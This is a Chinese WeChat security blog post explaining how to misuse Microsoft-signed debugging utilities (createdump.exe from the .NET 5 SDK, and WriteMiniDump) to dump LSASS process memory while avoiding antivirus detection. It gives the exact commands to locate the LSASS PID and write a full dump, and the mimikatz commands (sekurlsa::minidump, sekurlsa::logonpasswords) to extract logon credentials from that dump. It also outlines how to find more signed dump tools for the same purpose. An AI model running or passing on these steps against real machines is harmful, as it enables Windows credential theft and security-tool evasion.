#  聊聊minidump签名文件的滥用

原创 JC  [ JC的安全之路 ](javascript:void\(0\);)

**JC的安全之路** ![]()

微信号 csec527

功能介绍 一个安全从业者的想法见解 ，每周随缘更新1-2篇

____

___发表于_

收录于合集

#安全小技巧 6 个

#minidump 1 个

  

  

**前言**  
  

前段时间，看到好多佬发minidump的姿势，突发奇想，合法签名的dump难道不是更加专业？

  

 **01** **聊聊对抗相关  
**

  

AV对抗到现在，基本上最终的目的其实都是恶意软件合法化，关键点就在于如何让一个恶意文件变成合法的受反病毒所信任的一个文件。

目前流传的一些方法，寻找那些签名的辅助小工具，比如常见的Teamview，Todesk，向日葵远程控制，接下来以createdump.exe为例，聊聊如何寻找dump内存的白利用。  

  *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    C:\Users\JC\Desktop\dump>createdump.execreatedump [options] pid-f, --name - dump path and file name. The default is '%TEMP%\dump.%p.dmp'. These specifiers are substituted with following values:   %p  PID of dumped process.   %e  The process executable filename.   %h  Hostname return by gethostname().   %t  Time of dump, expressed as seconds since the Epoch, 1970-01-01 00:00:00 +0000 (UTC).-n, --normal - create minidump.-h, --withheap - create minidump with heap (default).-t, --triage - create triage minidump.-u, --full - create full core dump.-d, --diag - enable diagnostic messages.

这是一个合法的工具，带有微软签名，在微软的.net5.0的SDK工具包中。

下载地址：

https://dotnet.microsoft.com/zh-cn/download/dotnet/thank-
you/sdk-5.0.408-windows-x64-installer

安装后，搜一下就找到了

  * 

    
    
    C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.0.17

  

![](https://gitee.com/fuli009/images/raw/master/public/20230623141100.png)

它带有合法数字签名以及证书：

![](https://gitee.com/fuli009/images/raw/master/public/20230623141102.png)

  

使用也很简单，先找到lsass的进程，再使用管理员权限进行导出dump文件

  *   *   *   *   *   * 

    
    
    C:\Users\JC\Desktop\dump>tasklist |findstr lsasslsass.exe                      616 Services                   0     43,740 K  
    C:\Users\JC\Desktop\dump>createdump.exe 616 -uWriting full dump to file C:\Users\JC\AppData\Local\Temp\dump.616.dmpDump successfully written

![](https://gitee.com/fuli009/images/raw/master/public/20230623141104.png)

接下来嘛，使用mimikatz一把(没啥好说的)

> peach # sekurlsa::minidump C:\Users\JC\Desktop\dump.616.dmp  
> Switch to MINIDUMP : 'C:\Users\JC\Desktop\dump.616.dmp'  
>  
> peach # sekurlsa::logonpasswords  
>  
>

 **02** **如何查找  
**  
从查找来说，其实很简单，因为很多程序在上线之初，或多或少存在这样或者那样的BUG，有很多导致程序崩溃的BUG，开发为了方便定位BUG，一般会有附带的独立调试工具，这些调试工具中就包含dump程序内存，用来定位异常和调试。对我们而言，这些dump工具就是天然的白利用。  
    这里我就根据本机安装的一些正常软件，查找这类利用：

![]()

可以看到这个程序，也是用于dump内存的，并且包含微软的签名：  
![](https://gitee.com/fuli009/images/raw/master/public/20230623141105.png)简单的运行一下：  

![](https://gitee.com/fuli009/images/raw/master/public/20230623141106.png)

可以看到很贴心的给出了帮助:

![](https://gitee.com/fuli009/images/raw/master/public/20230623141107.png)

当然也是可以dump成功的。  

 除了上面的，其实还有很多，再举个例子：

 **WriteMiniDump**

![](https://gitee.com/fuli009/images/raw/master/public/20230623141108.png)

  

使用方法

  * 

    
    
    WriteMiniDump /type full 1844 123.dmp

![](https://gitee.com/fuli009/images/raw/master/public/20230623141109.png)

当然，这个有一定限制，只能dump32位进程的内存，仅仅只是举个例子罢了。

  
  

 **03** **写在最后  
**  

  

  世上本没有路

走得人多了

便有了路

安全亦是如此

  
  

![](https://gitee.com/fuli009/images/raw/master/public/20230623141110.png)

  

  

  
 **END**  
![]() **扫码关注了解更多** 安全小技巧  
  

  

  

  

  
  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

